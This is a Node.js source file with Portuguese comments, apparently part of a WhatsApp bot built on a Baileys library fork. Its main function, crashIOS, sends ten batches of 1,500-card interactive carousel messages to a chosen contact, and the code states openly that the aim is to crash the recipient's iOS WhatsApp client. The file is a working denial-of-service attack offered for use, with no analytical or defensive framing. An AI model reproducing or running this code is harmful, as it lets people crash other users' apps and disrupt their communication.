// main.js
const {
  generateWAMessageFromContent,
  delay
} = require("@angstvorfrauen/baileys");
const fs = require("fs");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");

// === VARIÁVEL GLOBAL DO SOCKET ===
let sock = null;

// === DEFINE O SOCKET (chamado uma vez no index.js) ===
function setSocket(socket) {
  sock = socket;

  // === DEFINE sendjson GLOBAL NO sock ===
  sock.sendjson = (jid, content, options = {}) => {
    const msg = generateWAMessageFromContent(jid, content, options);
    return sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
  };

  console.log("[MAIN] Socket definido e sendjson pronto.");
}

// === CRASH iOS: SÓ RECEBE targetJid ===
async function crashIOS(targetJid) {
  if (!sock) {
    console.error("[CRASH] Socket não definido!");
    throw new Error("Socket não inicializado");
  }

  console.log(`[CRASH] Enviando 10 lotes de 1500 cards para ${targetJid}...`);

  for (let i = 0; i < 10; i++) {
    const singleCard = {
      header: {
        title: ".",
        imageMessage: {
          url,
          mimetype: "image/jpeg",
          caption: ".",
          fileSha256,
          fileLength: "10",
          height: 1000,
          width: 1000,
          mediaKey,
          fileEncSha256,
          directPath,
          jpegThumbnail
        },
        hasMediaAttachment: true
      },
      body: { text: "." },
      footer: { text: "." },
      nativeFlowMessage: {
        buttons: [{
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "x",
            url: "https://google.com",
            merchant_url: "https://google.com"
          })
        }]
      }
    };

    const cards = Array(1500).fill(singleCard);

    try {
      console.log(`[CRASH] Lote ${i + 1}/10 → ${targetJid}`);
      await sock.sendjson(targetJid, {
        interactiveMessage: {
          body: { text: "." },
          carouselMessage: { cards }
        }
      });
      await delay(800);
    } catch (err) {
      console.error(`[CRASH] Erro no lote ${i + 1}:`, err.message);
    }
  }

  console.log("[CRASH] 10 lotes enviados com sucesso!");
}

// === HANDLER (pode ficar vazio) ===
module.exports = async () => {};

// === EXPORTA FUNÇÕES ===
module.exports.setSocket = setSocket;
module.exports.crashIOS = crashIOS;

// === HOT RELOAD ===
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log("[HOT-RELOAD] main.js recarregado");
  delete require.cache[file];
  require(file);
});
